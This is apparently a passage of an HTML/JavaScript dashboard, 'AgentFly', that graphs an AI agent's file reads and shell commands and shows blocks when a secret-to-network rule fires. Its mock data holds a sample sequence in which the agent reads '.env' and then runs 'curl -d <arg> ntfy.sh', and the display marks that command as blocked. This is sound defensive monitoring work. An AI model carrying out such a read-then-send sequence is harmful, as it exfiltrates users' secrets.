<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>AgentFly</title>
  <style>
    :root {
      color-scheme: light dark;
      --sans: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
      --bg: #0b0e14;
      --bar: #121722;
      --bar-border: #232a38;
      --fg: #eef2f7;
      --muted: #8b95a7;
      --btn-bg: #1b2230;
      --btn-bg-hover: #273043;
      --btn-border: #2f3a4f;
      --live: #22c55e;
      --step: #6b7280;
      --file: #2563eb;
      --sensitive: #d97706;
      --taint: #f59e0b;
      --blocked: #dc2626;
      --blocked-border: #fca5a5;
      --glow: rgba(248, 113, 113, 0.95);
      --warned: #7c3aed;
      --rule-fill: #7f1d1d;
      --rule-border: #ef4444;
      --chain: #7b8494;
      --aux-edge: #5b6475;
      --banner-bg: #b91c1c;
      --banner-fg: #ffffff;
    }

    @media (prefers-color-scheme: light) {
      :root {
        --bg: #f5f7fa;
        --bar: #ffffff;
        --bar-border: #dde2ea;
        --fg: #111827;
        --muted: #5b6475;
        --btn-bg: #ffffff;
        --btn-bg-hover: #eef1f5;
        --btn-border: #c9d0db;
        --live: #16a34a;
        --step: #6b7280;
        --file: #2563eb;
        --sensitive: #d97706;
        --taint: #d97706;
        --blocked: #dc2626;
        --blocked-border: #7f1d1d;
        --glow: rgba(220, 38, 38, 0.8);
        --warned: #7c3aed;
        --rule-fill: #b91c1c;
        --rule-border: #7f1d1d;
        --chain: #6b7280;
        --aux-edge: #9aa3b2;
        --banner-bg: #dc2626;
        --banner-fg: #ffffff;
      }
    }

    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      height: 100%;
      background: var(--bg);
      color: var(--fg);
      font-family: var(--sans);
      font-size: 16px;
      overflow: hidden;
    }
    body {
      display: flex;
      flex-direction: column;
    }
    button { font-family: var(--sans); }

    #bar {
      position: relative;
      flex: 0 0 auto;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 8px 12px;
      padding: 10px 14px;
      background: var(--bar);
      border-bottom: 1px solid var(--bar-border);
      z-index: 10;
    }
    #brand {
      font-size: 18px;
      font-weight: 700;
      white-space: nowrap;
    }
    .live {
      display: inline-flex;
      align-items: center;
      gap: 7px;
      font-size: 13px;
      font-weight: 700;
      letter-spacing: 0.1em;
      color: var(--live);
    }
    .live .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: var(--live);
      box-shadow: 0 0 0 0 var(--live);
      animation: live-pulse 1.8s ease-out infinite;
    }
    .live.mock { color: var(--muted); }
    .live.mock .dot {
      background: var(--muted);
      animation: none;
    }
    @keyframes live-pulse {
      0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.6); }
      70% { box-shadow: 0 0 0 9px rgba(34, 197, 94, 0); }
      100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
    }
    #session {
      font-family: var(--mono);
      font-size: 13px;
      color: var(--muted);
      white-space: nowrap;
    }
    #taint {
      display: none;
      font-size: 13px;
      font-weight: 700;
      padding: 4px 10px;
      border-radius: 999px;
      color: #fff;
      background: var(--sensitive);
      white-space: nowrap;
    }
    #taint.visible { display: inline-block; }
    .spacer { flex: 1 1 auto; }
    .counters {
      display: inline-flex;
      gap: 10px;
      font-size: 14px;
      color: var(--muted);
      white-space: nowrap;
    }
    .counters b {
      font-size: 18px;
      color: var(--fg);
      font-variant-numeric: tabular-nums;
    }
    .counters .has-blocked b { color: var(--blocked); }
    .controls {
      display: inline-flex;
      align-items: center;
      gap: 8px;
    }
    #zoom {
      display: inline-flex;
      border: 1px solid var(--btn-border);
      border-radius: 6px;
      overflow: hidden;
      background: var(--btn-bg);
    }
    #zoom button {
      border: none;
      border-right: 1px solid var(--btn-border);
      background: transparent;
      color: var(--fg);
      font-size: 15px;
      min-width: 30px;
      padding: 6px 6px;
      cursor: pointer;
    }
    #zoom button:last-child { border-right: none; }
    #zoom button:hover, #new-session:hover { background: var(--btn-bg-hover); }
    #zoom-pct {
      min-width: 50px;
      font-size: 13px !important;
      font-variant-numeric: tabular-nums;
    }
    #new-session {
      font-size: 14px;
      padding: 7px 12px;
      border-radius: 6px;
      border: 1px solid var(--btn-border);
      background: var(--btn-bg);
      color: var(--fg);
      cursor: pointer;
      white-space: nowrap;
    }

    #offline {
      display: none;
      position: absolute;
      inset: 0;
      align-items: center;
      justify-content: center;
      background: var(--banner-bg);
      color: var(--banner-fg);
      font-size: 26px;
      font-weight: 800;
      letter-spacing: 0.04em;
      z-index: 20;
    }
    #offline.visible { display: flex; }

    #block {
      flex: 0 0 auto;
      overflow: hidden;
      max-height: 0;
      background: var(--banner-bg);
      color: var(--banner-fg);
      text-align: center;
      transform: translateY(-100%);
      transition: max-height 450ms ease-out, transform 450ms ease-out;
      z-index: 5;
      position: relative;
    }
    #block.visible {
      max-height: 220px;
      transform: translateY(0);
    }
    #block .inner { padding: 16px 48px 18px 20px; }
    #block-title {
      font-size: 44px;
      font-weight: 800;
      letter-spacing: 0.03em;
      line-height: 1.1;
    }
    #block-reason {
      margin-top: 6px;
      font-size: 21px;
      font-weight: 500;
      line-height: 1.3;
    }
    #block-close {
      position: absolute;
      top: 10px;
      right: 12px;
      width: 36px;
      height: 36px;
      margin: 0;
      padding: 0;
      border: 1px solid rgba(255, 255, 255, 0.45);
      border-radius: 6px;
      background: rgba(0, 0, 0, 0.2);
      color: var(--banner-fg);
      font-size: 22px;
      line-height: 1;
      cursor: pointer;
    }
    #block-close:hover,
    #block-close:focus-visible {
      background: rgba(0, 0, 0, 0.35);
      outline: 2px solid rgba(255, 255, 255, 0.7);
      outline-offset: 2px;
    }
    #block:not(.visible) #block-close {
      visibility: hidden;
      pointer-events: none;
    }

    #stage {
      position: relative;
      flex: 1 1 auto;
      min-height: 0;
    }
    #graph {
      position: absolute;
      inset: 0;
    }
    #empty {
      display: none;
      position: absolute;
      inset: 0;
      align-items: center;
      justify-content: center;
      gap: 14px;
      font-size: 26px;
      color: var(--muted);
      pointer-events: none;
    }
    #empty.visible { display: flex; }
    #empty .dot { width: 14px; height: 14px; }

    #legend {
      flex: 0 0 auto;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 6px 22px;
      padding: 10px 16px;
      border-top: 1px solid var(--bar-border);
      background: var(--bar);
      font-size: 15px;
      color: var(--muted);
    }
    #legend .item {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      white-space: nowrap;
    }
    #legend .item[hidden] { display: none; }
    #legend .sw {
      width: 16px;
      height: 16px;
      border-radius: 4px;
      background: var(--c);
    }
    #legend .sw.line {
      width: 22px;
      height: 4px;
      border-radius: 2px;
    }
    #legend .sw.rule {
      background: var(--rule-fill);
      box-shadow: inset 0 0 0 2px var(--rule-border);
    }

    @media (prefers-reduced-motion: reduce) {
      .live .dot { animation: none; }
      #block { transition: none; }
    }
  </style>
</head>
<body>
  <header id="bar">
    <span id="brand">AgentFly</span>
    <span id="live" class="live"><span class="dot"></span><span id="live-text">LIVE</span></span>
    <span id="session"></span>
    <span id="taint"></span>
    <span class="spacer"></span>
    <span class="counters">
      <span><b id="n-steps">0</b> steps</span>
      <span id="blocked-counter"><b id="n-blocked">0</b> blocked</span>
    </span>
    <span class="controls">
      <span id="zoom">
        <button type="button" id="zoom-out" aria-label="Zoom out">−</button>
        <button type="button" id="zoom-pct" aria-label="Fit to view" title="Fit to view">Fit</button>
        <button type="button" id="zoom-in" aria-label="Zoom in">+</button>
      </span>
      <button type="button" id="new-session">New session</button>
    </span>
    <div id="offline">OFFLINE — recorder not reachable</div>
  </header>
  <section id="block" aria-live="assertive">
    <button type="button" id="block-close" aria-label="Dismiss blocked banner" title="Dismiss">×</button>
    <div class="inner">
      <div id="block-title"></div>
      <div id="block-reason"></div>
    </div>
  </section>
  <main id="stage">
    <div id="graph"></div>
    <div id="empty"><span id="empty-live" class="live"><span class="dot"></span></span><span>Waiting for agent actions…</span></div>
  </main>
  <footer id="legend">
    <span class="item"><span class="sw" style="--c: var(--step)"></span>Step</span>
    <span class="item"><span class="sw" style="--c: var(--file)"></span>File / host</span>
    <span class="item"><span class="sw" style="--c: var(--sensitive)"></span>Secret file</span>
    <span class="item"><span class="sw line" style="--c: var(--taint)"></span>After secret read</span>
    <span class="item"><span class="sw" style="--c: var(--blocked)"></span>Blocked</span>
    <span class="item" id="legend-warned" hidden><span class="sw" style="--c: var(--warned)"></span>Warned</span>
    <span class="item"><span class="sw rule"></span>Rule</span>
  </footer>

  <script src="https://unpkg.com/vis-network@10.1.2/standalone/umd/vis-network.min.js"></script>
  <script>
(function () {
  "use strict";

  var SANS = 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif';
  var MONO = 'ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace';
  var FONT_PX = 20;
  var MONO_PX = 17;
  var CMD_MAX = 20;
  var PATH_MAX = 22;
  var MAX_STEPS = 10;
  var COL_GUTTER = 56;
  var FILE_Y = -170;
  var HOST_Y = 170;
  var RULE_BELOW_HOST_Y = 320;
  var POLL_GAP_MS = 1000;
  var POLL_TIMEOUT_MS = 1500;
  var MOCK_INTERVAL_MS = 1600;
  var STORAGE_KEY = "fr_ignore_session";
  var VIEW_PAD_PX = 36;
  var MIN_SCALE = 0.15;
  var MAX_FIT_SCALE = 1.7;
  var MAX_SCALE = 4;
  var ZOOM_FACTOR = 1.2;
  var EASE_MS = 400;
  var ENTER_MS = 380;
  var ENTER_SLIDE = 50;
  var PULSE_PERIOD_MS = 800;
  var PULSE_COUNT = 3;
  var GLOW_HOLD = 34;

  var RULE_REASONS = {
    R1: "A secret was read earlier in this session, and now data is being sent out.",
    R0: "This action touches the recorder itself.",
  };
  var RULE_NAMES = {
    R1: "secret → network",
    R0: "recorder guard",
  };

  var offlineEl = document.getElementById("offline");
  var liveEl = document.getElementById("live");
  var liveTextEl = document.getElementById("live-text");
  var emptyLiveEl = document.getElementById("empty-live");
  var sessionEl = document.getElementById("session");
  var taintEl = document.getElementById("taint");
  var nStepsEl = document.getElementById("n-steps");
  var nBlockedEl = document.getElementById("n-blocked");
  var blockedCounterEl = document.getElementById("blocked-counter");
  var blockEl = document.getElementById("block");
  var blockTitleEl = document.getElementById("block-title");
  var blockReasonEl = document.getElementById("block-reason");
  var blockCloseBtn = document.getElementById("block-close");
  var emptyEl = document.getElementById("empty");
  var graphEl = document.getElementById("graph");
  var legendWarnedEl = document.getElementById("legend-warned");
  var newSessionBtn = document.getElementById("new-session");
  var zoomInBtn = document.getElementById("zoom-in");
  var zoomOutBtn = document.getElementById("zoom-out");
  var zoomPctBtn = document.getElementById("zoom-pct");

  if (typeof vis === "undefined") {
    graphEl.textContent = "Graph library did not load";
    return;
  }

  var params = new URLSearchParams(window.location.search);
  var isMock = params.get("mock") === "1";

  var nodesDS = new vis.DataSet([]);
  var edgesDS = new vis.DataSet([]);
  var network = new vis.Network(
    graphEl,
    { nodes: nodesDS, edges: edgesDS },
    {
      physics: false,
      layout: { hierarchical: false },
      interaction: {
        dragNodes: false,
        dragView: true,
        zoomView: false,
        selectable: false,
        hover: false,
      },
      nodes: { shape: "box", fixed: true },
      edges: { smooth: false },
    }
  );

  var lastPayloadKey = null;
  var lastSteps = [];
  var shownSession = null;
  var ignoreSession = null;
  var manualScale = null;
  var nodeWant = {};
  var edgeWant = {};
  var animating = {};
  var animFrame = null;
  var seenBlocked = {};

  var reducedQuery = window.matchMedia
    ? window.matchMedia("(prefers-reduced-motion: reduce)")
    : null;

  function reducedMotion() {
    return !!(reducedQuery && reducedQuery.matches);
  }

  try {
    ignoreSession = sessionStorage.getItem(STORAGE_KEY);
    if (ignoreSession === "") ignoreSession = null;
  } catch (e) {
    ignoreSession = null;
  }

  var mockTimer = null;
  var mockSessionId = null;
  var mockIndex = 0;

  var MOCK_STEPS = [
    { order: 1, kind: "read", verdict: "allowed", tool: null, file: "README.md", sensitive: false, command: null, host: null, rule: null },
    { order: 2, kind: "read", verdict: "allowed", tool: null, file: ".env", sensitive: true, command: null, host: null, rule: null },
    { order: 3, kind: "read", verdict: "allowed", tool: null, file: "README.md", sensitive: false, command: null, host: null, rule: null },
    { order: 4, kind: "shell", verdict: "allowed", tool: null, file: null, sensitive: false, command: "ls", host: null, rule: null },
    { order: 5, kind: "shell", verdict: "blocked", tool: null, file: null, sensitive: false, command: "curl -d <arg> ntfy.sh", host: "ntfy.sh", rule: "R1" },
  ];

  function cssVar(name) {
    return getComputedStyle(document.documentElement).getPropertyValue(name).trim();
  }

  function themeColors() {
    return {
      bg: cssVar("--bg"),
      step: cssVar("--step"),
      file: cssVar("--file"),
      sensitive: cssVar("--sensitive"),
      taint: cssVar("--taint"),
      blocked: cssVar("--blocked"),
      blockedBorder: cssVar("--blocked-border"),
      glow: cssVar("--glow"),
      warned: cssVar("--warned"),
      ruleFill: cssVar("--rule-fill"),
      ruleBorder: cssVar("--rule-border"),
      chain: cssVar("--chain"),
      aux: cssVar("--aux-edge"),
    };
  }

  function truncate(text, maxLen) {
    var s = String(text);
    if (s.length <= maxLen) return s;
    return s.slice(0, maxLen - 1) + "…";
  }

  function shortSession(id) {
    var s = String(id);
    return s.length > 9 ? s.slice(0, 8) + "…" : s;
  }

  function stepDetail(step) {
    if (step.kind === "read" || step.kind === "edit") return "";
    if (step.command) return String(step.command);
    if (step.tool) return String(step.tool);
    return "";
  }

  function stepFill(verdict, c) {
    if (verdict === "blocked") return c.blocked;
    if (verdict === "warned") return c.warned;
    return c.step;
  }

  function solid(fill, border) {
    return {
      background: fill,
      border: border || fill,
      highlight: { background: fill, border: border || fill },
      hover: { background: fill, border: border || fill },
    };
  }

  function font(size, extra) {
    var f = { color: "#ffffff", size: size, face: SANS };
    if (extra) Object.keys(extra).forEach(function (k) { f[k] = extra[k]; });
    return f;
  }

  var measureCtx = document.createElement("canvas").getContext("2d");

  function textWidth(text, px, face, bold) {
    measureCtx.font = (bold ? "bold " : "") + px + "px " + face;
    return measureCtx.measureText(String(text)).width;
  }

  // Each column is as wide as the widest node it holds, so short steps sit
  // close together and the graph can be drawn larger.
  function columnWidth(step) {
    var blocked = step.verdict === "blocked";
    var w = textWidth(step.order + " · " + step.kind, blocked ? FONT_PX + 6 : FONT_PX, SANS, true);
    var detail = stepDetail(step);
    if (detail) w = Math.max(w, textWidth(truncate(detail, CMD_MAX), blocked ? MONO_PX + 4 : MONO_PX, MONO));
    w += blocked ? 52 : 40;
    if (step.file != null) w = Math.max(w, textWidth(truncate(step.file, PATH_MAX), FONT_PX, MONO) + 36);
    if (step.host != null) w = Math.max(w, textWidth(truncate(step.host, PATH_MAX), FONT_PX, MONO) + 36);
    if (step.rule != null) w = Math.max(w, textWidth(ruleLabel(step.rule), FONT_PX + 4, SANS, true) + 52);
    return w + COL_GUTTER;
  }

  function columnCenters(steps) {
    var xs = [];
    var prevW = 0;
    for (var i = 0; i < steps.length; i++) {
      var w = columnWidth(steps[i]);
      xs.push(i === 0 ? 0 : xs[i - 1] + (prevW + w) / 2);
      prevW = w;
    }
    return xs;
  }

  function firstSensitiveOrder(steps) {
    for (var i = 0; i < steps.length; i++) {
      if (steps[i].sensitive) return steps[i].order;
    }
    return null;
  }

  function ruleReason(step) {
    if (typeof step.rule_message === "string" && step.rule_message.trim() !== "") {
      return step.rule_message;
    }
    if (Object.prototype.hasOwnProperty.call(RULE_REASONS, step.rule)) {
      return RULE_REASONS[step.rule];
    }
    return "This action broke rule " + String(step.rule) + ".";
  }

  function ruleLabel(ruleId) {
    var id = String(ruleId);
    if (Object.prototype.hasOwnProperty.call(RULE_NAMES, id)) {
      return id + "  " + RULE_NAMES[id];
    }
    return id;
  }

  function curveTo(fromCol, toCol, bendUp) {
    if (fromCol === toCol) return false;
    var goingLeft = toCol < fromCol;
    var cw = goingLeft ? !bendUp : bendUp;
    return {
      enabled: true,
      type: cw ? "curvedCW" : "curvedCCW",
      roundness: Math.min(0.2 + 0.35 * (Math.abs(toCol - fromCol) - 1), 0.8),
    };
  }

  // Positions use each step's index in the whole session so that nodes keep
  // their place when the last-10 window slides forward.
  function buildDesired(allSteps) {
    var c = themeColors();
    var offset = Math.max(allSteps.length - MAX_STEPS, 0);
    var xs = columnCenters(allSteps);
    var visible = allSteps.slice(offset);
    var taintFrom = firstSensitiveOrder(allSteps);
    var nodes = [];
    var edges = [];
    var fileCol = {};
    var fileSensitive = {};
    var hostCol = {};
    var hostBlocked = {};
    var ruleSpot = {};
    var i, step, col, sid;

    for (i = 0; i < visible.length; i++) {
      step = visible[i];
      col = offset + i;
      if (step.file != null) {
        if (fileCol[step.file] === undefined) fileCol[step.file] = col;
        if (step.sensitive) fileSensitive[step.file] = true;
      }
      if (step.host != null) {
        if (hostCol[step.host] === undefined) hostCol[step.host] = col;
        if (step.verdict === "blocked") hostBlocked[step.host] = true;
      }
      if (step.rule != null && ruleSpot[step.rule] === undefined) {
        var ry = step.file == null ? FILE_Y : step.host == null ? HOST_Y : RULE_BELOW_HOST_Y;
        ruleSpot[step.rule] = { col: col, y: ry };
      }
    }

    for (i = 0; i < visible.length; i++) {
      step = visible[i];
      col = offset + i;
      sid = "step:" + step.order;
      var blocked = step.verdict === "blocked";
      var fill = stepFill(step.verdict, c);
      var detail = stepDetail(step);
      var label = "<b>" + step.order + " · " + String(step.kind) + "</b>";
      if (detail) label += "\n<code>" + truncate(detail, CMD_MAX) + "</code>";
      var node = {
        id: sid,
        label: label,
        x: xs[col],
        y: 0,
        color: solid(fill, blocked ? c.blockedBorder : fill),
        borderWidth: blocked ? 4 : 2,
        margin: blocked ? { top: 20, bottom: 20, left: 24, right: 24 } : { top: 14, bottom: 14, left: 18, right: 18 },
        shapeProperties: { borderRadius: 10 },
        font: font(blocked ? FONT_PX + 6 : FONT_PX, {
          multi: "html",
          bold: { color: "#ffffff", size: blocked ? FONT_PX + 6 : FONT_PX, face: SANS, mod: "bold" },
          mono: { color: "#ffffff", size: blocked ? MONO_PX + 4 : MONO_PX, face: MONO },
        }),
        shadow: blocked
          ? { enabled: true, color: c.glow, size: GLOW_HOLD, x: 0, y: 0 }
          : { enabled: false },
      };
      nodes.push(node);

      if (i > 0) {
        var prev = visible[i - 1];
        var tainted = taintFrom != null && prev.order >= taintFrom;
        edges.push({
          id: "next:" + prev.order + ":" + step.order,
          from: "step:" + prev.order,
          to: sid,
          arrows: { to: { enabled: true, scaleFactor: 0.8 } },
          color: { color: tainted ? c.taint : c.chain, opacity: 1 },
          width: tainted ? 6 : 3,
          smooth: false,
        });
      }

      if (step.file != null) {
        edges.push({
          id: "file-edge:" + step.order,
          from: sid,
          to: "file:" + step.file,
          arrows: { to: { enabled: true, scaleFactor: 0.6 } },
          color: { color: step.sensitive ? c.sensitive : c.aux, opacity: 0.8 },
          width: 1.5,
          smooth: curveTo(col, fileCol[step.file], true),
        });
      }

      if (step.host != null) {
        var hostEdge = {
          id: "host-edge:" + step.order,
          from: sid,
          to: "host:" + step.host,
          smooth: curveTo(col, hostCol[step.host], false),
        };
        if (blocked) {
          hostEdge.color = { color: c.blocked, opacity: 1 };
          hostEdge.width = 3;
          hostEdge.dashes = [10, 8];
          hostEdge.arrows = { to: { enabled: false } };
          hostEdge.label = "✕";
          hostEdge.font = { size: 40, face: SANS, color: c.blocked, strokeWidth: 8, strokeColor: c.bg, bold: true, align: "horizontal" };
        } else {
          hostEdge.color = { color: c.aux, opacity: 0.8 };
          hostEdge.width = 1.5;
          hostEdge.arrows = { to: { enabled: true, scaleFactor: 0.6 } };
        }
        edges.push(hostEdge);
      }

      if (step.rule != null) {
        var ruleColor = step.verdict === "warned" ? c.warned : c.blocked;
        edges.push({
          id: "rule-edge:" + step.order,
          from: sid,
          to: "rule:" + step.rule,
          arrows: { to: { enabled: true, scaleFactor: 0.9 } },
          dashes: [10, 8],
          color: { color: ruleColor, opacity: 1 },
          width: 3,
          smooth: curveTo(col, ruleSpot[step.rule].col, ruleSpot[step.rule].y < 0),
        });
      }
    }

    Object.keys(fileCol).forEach(function (path) {
      var amber = !!fileSensitive[path];
      nodes.push({
        id: "file:" + path,
        label: truncate(path, PATH_MAX),
        x: xs[fileCol[path]],
        y: FILE_Y,
        color: solid(amber ? c.sensitive : c.file),
        borderWidth: 2,
        margin: { top: 12, bottom: 12, left: 16, right: 16 },
        shapeProperties: { borderRadius: 8 },
        font: font(FONT_PX, { face: MONO }),
      });
    });

    Object.keys(hostCol).forEach(function (host) {
      var dim = !!hostBlocked[host];
      nodes.push({
        id: "host:" + host,
        label: truncate(host, PATH_MAX),
        x: xs[hostCol[host]],
        y: HOST_Y,
        opacity: dim ? 0.4 : 1,
        color: solid(c.file),
        borderWidth: 2,
        margin: { top: 12, bottom: 12, left: 16, right: 16 },
        shapeProperties: { borderRadius: 8, borderDashes: dim ? [6, 5] : false },
        font: font(FONT_PX, { face: MONO }),
      });
    });

    Object.keys(ruleSpot).forEach(function (ruleId) {
      var spot = ruleSpot[ruleId];
      nodes.push({
        id: "rule:" + ruleId,
        label: "<b>" + ruleLabel(ruleId) + "</b>",
        x: xs[spot.col],
        y: spot.y,
        color: solid(c.ruleFill, c.ruleBorder),
        borderWidth: 4,
        margin: { top: 16, bottom: 16, left: 22, right: 22 },
        shapeProperties: { borderRadius: 26 },
        font: font(FONT_PX + 4, {
          multi: "html",
          bold: { color: "#ffffff", size: FONT_PX + 4, face: SANS, mod: "bold" },
        }),
      });
    });

    return { nodes: nodes, edges: edges, visible: visible };
  }

  function easeOut(p) {
    return 1 - Math.pow(1 - p, 3);
  }

  function edgeColorWithOpacity(want, factor) {
    var col = {};
    Object.keys(want.color).forEach(function (k) { col[k] = want.color[k]; });
    col.opacity = (want.color.opacity == null ? 1 : want.color.opacity) * factor;
    return col;
  }

  function fadedFont(f, alpha) {
    var out = {};
    Object.keys(f).forEach(function (k) {
      var v = f[k];
      if (v && typeof v === "object") {
        out[k] = {};
        Object.keys(v).forEach(function (kk) { out[k][kk] = v[kk]; });
        if (out[k].color) out[k].color = "rgba(255,255,255," + alpha + ")";
      } else {
        out[k] = v;
      }
    });
    out.color = "rgba(255,255,255," + alpha + ")";
    return out;
  }

  // A timer, not requestAnimationFrame: rAF can stall in a hidden or
  // embedded view, which would leave new nodes invisible.
  function startAnimLoop() {
    if (animFrame != null) return;
    animFrame = setTimeout(function () {
      animTick(performance.now());
    }, 16);
  }

  function animTick(now) {
    animFrame = null;
    var nodeUpdates = [];
    var edgeUpdates = [];
    var remaining = 0;
    Object.keys(animating).forEach(function (key) {
      var a = animating[key];
      if (a.start == null) a.start = now;
      var t = now - a.start;
      if (a.type === "enter-node") {
        var want = nodeWant[a.id] && nodeWant[a.id].item;
        if (!want) { delete animating[key]; return; }
        var p = Math.min(t / ENTER_MS, 1);
        var e = easeOut(p);
        var baseOpacity = want.opacity == null ? 1 : want.opacity;
        if (p >= 1) {
          nodeUpdates.push({ id: a.id, opacity: baseOpacity, x: want.x, font: want.font });
          delete animating[key];
        } else {
          nodeUpdates.push({
            id: a.id,
            opacity: baseOpacity * e,
            x: want.x + (1 - e) * ENTER_SLIDE,
            font: fadedFont(want.font, e),
          });
          remaining++;
        }
      } else if (a.type === "enter-edge") {
        var ew = edgeWant[a.id] && edgeWant[a.id].item;
        if (!ew) { delete animating[key]; return; }
        var pe = Math.min(t / ENTER_MS, 1);
        edgeUpdates.push({ id: a.id, color: edgeColorWithOpacity(ew, easeOut(pe)) });
        if (pe >= 1) delete animating[key]; else remaining++;
      } else if (a.type === "pulse") {
        var pw = nodeWant[a.id] && nodeWant[a.id].item;
        if (!pw) { delete animating[key]; return; }
        var total = PULSE_PERIOD_MS * PULSE_COUNT;
        var size = GLOW_HOLD;
        if (t < total) {
          var phase = (t % PULSE_PERIOD_MS) / PULSE_PERIOD_MS;
          size = 8 + 52 * Math.sin(Math.PI * phase);
          remaining++;
        } else {
          delete animating[key];
        }
        nodeUpdates.push({ id: a.id, shadow: { enabled: true, color: pw.shadow.color, size: size, x: 0, y: 0 } });
      }
    });
    if (nodeUpdates.length) nodesDS.update(nodeUpdates);
    if (edgeUpdates.length) edgesDS.update(edgeUpdates);
    if (remaining > 0) startAnimLoop();
  }

  function stopAnimations() {
    animating = {};
    if (animFrame != null) {
      clearTimeout(animFrame);
      animFrame = null;
    }
  }

  function syncDataSet(ds, wantMap, desiredList, kind, animate) {
    var nextMap = {};
    var adds = [];
    var updates = [];
    desiredList.forEach(function (item) {
      nextMap[item.id] = item;
    });
    var removeIds = ds.getIds().filter(function (id) {
      return !Object.prototype.hasOwnProperty.call(nextMap, id);
    });
    if (removeIds.length) ds.remove(removeIds);
    removeIds.forEach(function (id) {
      delete wantMap[id];
      delete animating["enter-" + kind + ":" + id];
      delete animating["pulse:" + id];
    });
    var added = [];
    desiredList.forEach(function (item) {
      var json = JSON.stringify(item);
      var prev = wantMap[item.id];
      if (!prev) {
        wantMap[item.id] = { json: json, item: item };
        if (animate) {
          var start = {};
          Object.keys(item).forEach(function (k) { start[k] = item[k]; });
          if (kind === "node") {
            start.opacity = 0;
            start.x = item.x + ENTER_SLIDE;
            start.font = fadedFont(item.font, 0);
          } else {
            start.color = edgeColorWithOpacity(item, 0);
          }
          adds.push(start);
          animating["enter-" + kind + ":" + item.id] = { type: "enter-" + kind, id: item.id, start: null };
        } else {
          adds.push(item);
        }
        added.push(item.id);
      } else if (prev.json !== json) {
        wantMap[item.id] = { json: json, item: item };
        if (!animating["enter-" + kind + ":" + item.id]) updates.push(item);
      }
    });
    if (adds.length) ds.add(adds);
    if (updates.length) ds.update(updates);
    return added;
  }

  function want(map) {
    var out = {};
    Object.keys(map).forEach(function (id) { out[id] = map[id].item; });
    return out;
  }

  function computeBounds() {
    var ids = nodesDS.getIds();
    if (ids.length === 0) return null;
    network.redraw();
    var nw = want(nodeWant);
    var b = { minX: Infinity, maxX: -Infinity, minY: Infinity, maxY: -Infinity };
    ids.forEach(function (id) {
      var w = nw[id];
      if (!w) return;
      var box = network.getBoundingBox(id);
      var halfW = box ? (box.right - box.left) / 2 : 90;
      var halfH = box ? (box.bottom - box.top) / 2 : 40;
      var glow = w.shadow && w.shadow.enabled ? w.shadow.size * 0.6 : 0;
      b.minX = Math.min(b.minX, w.x - halfW - glow);
      b.maxX = Math.max(b.maxX, w.x + halfW + glow);
      b.minY = Math.min(b.minY, w.y - halfH - glow);
      b.maxY = Math.max(b.maxY, w.y + halfH + glow);
    });
    return b;
  }

  function clampScale(s, max) {
    return Math.max(MIN_SCALE, Math.min(max, s));
  }

  function updateZoomLabel() {
    zoomPctBtn.textContent = manualScale == null ? "Fit" : Math.round(manualScale * 100) + "%";
  }

  function fitView(animate) {
    network.setSize("100%", "100%");
    var b = computeBounds();
    if (!b) return;
    var cw = Math.max(graphEl.clientWidth - 2 * VIEW_PAD_PX, 1);
    var ch = Math.max(graphEl.clientHeight - 2 * VIEW_PAD_PX, 1);
    var fit = clampScale(Math.min(cw / (b.maxX - b.minX), ch / (b.maxY - b.minY)), MAX_FIT_SCALE);
    var scale = manualScale == null ? fit : manualScale;
    network.moveTo({
      position: { x: (b.minX + b.maxX) / 2, y: (b.minY + b.maxY) / 2 },
      scale: scale,
      animation: animate && !reducedMotion() ? { duration: EASE_MS, easingFunction: "easeInOutQuad" } : false,
    });
    updateZoomLabel();
  }

  function setZoom(next) {
    manualScale = clampScale(next, MAX_SCALE);
    network.moveTo({
      scale: manualScale,
      animation: reducedMotion() ? false : { duration: 200, easingFunction: "easeInOutQuad" },
    });
    updateZoomLabel();
  }

  function setOffline(on) {
    offlineEl.classList.toggle("visible", on);
  }

  function setEmpty(on) {
    emptyEl.classList.toggle("visible", on);
  }

  function hideBlockBanner() {
    blockEl.classList.remove("visible");
  }

  function showBlockBanner(step) {
    blockTitleEl.textContent = "BLOCKED by " + String(step.rule == null ? "rule" : step.rule);
    blockReasonEl.textContent = ruleReason(step);
    blockEl.classList.add("visible");
  }

  function updateHeader(session, steps) {
    sessionEl.textContent = session == null ? "" : shortSession(session);
    sessionEl.title = session == null ? "" : "Session " + String(session);
    nStepsEl.textContent = String(steps.length);
    var blocked = steps.filter(function (s) { return s.verdict === "blocked"; }).length;
    nBlockedEl.textContent = String(blocked);
    blockedCounterEl.classList.toggle("has-blocked", blocked > 0);
    var taint = firstSensitiveOrder(steps);
    if (taint == null) {
      taintEl.classList.remove("visible");
      taintEl.textContent = "";
    } else {
      taintEl.textContent = "secret read at step " + taint;
      taintEl.classList.add("visible");
    }
  }

  function clearGraph() {
    stopAnimations();
    nodesDS.clear();
    edgesDS.clear();
    nodeWant = {};
    edgeWant = {};
    seenBlocked = {};
    lastPayloadKey = null;
    lastSteps = [];
    manualScale = null;
    hideBlockBanner();
    legendWarnedEl.hidden = true;
    updateHeader(null, []);
    updateZoomLabel();
    setEmpty(true);
  }

  function render(steps, animate) {
    var desired = buildDesired(steps);
    var motion = animate && !reducedMotion();
    var addedNodes = syncDataSet(nodesDS, nodeWant, desired.nodes, "node", motion);
    syncDataSet(edgesDS, edgeWant, desired.edges, "edge", motion);
    lastSteps = steps;

    var newBlocked = null;
    desired.visible.forEach(function (step) {
      if (step.verdict === "blocked" && !seenBlocked[step.order]) {
        seenBlocked[step.order] = true;
        newBlocked = step;
        if (!reducedMotion()) {
          animating["pulse:" + "step:" + step.order] = { type: "pulse", id: "step:" + step.order, start: null };
        }
      }
    });
    if (newBlocked) showBlockBanner(newBlocked);

    legendWarnedEl.hidden = !desired.visible.some(function (s) { return s.verdict === "warned"; });
    setEmpty(desired.visible.length === 0);

    if (addedNodes.length > 0) manualScale = null;
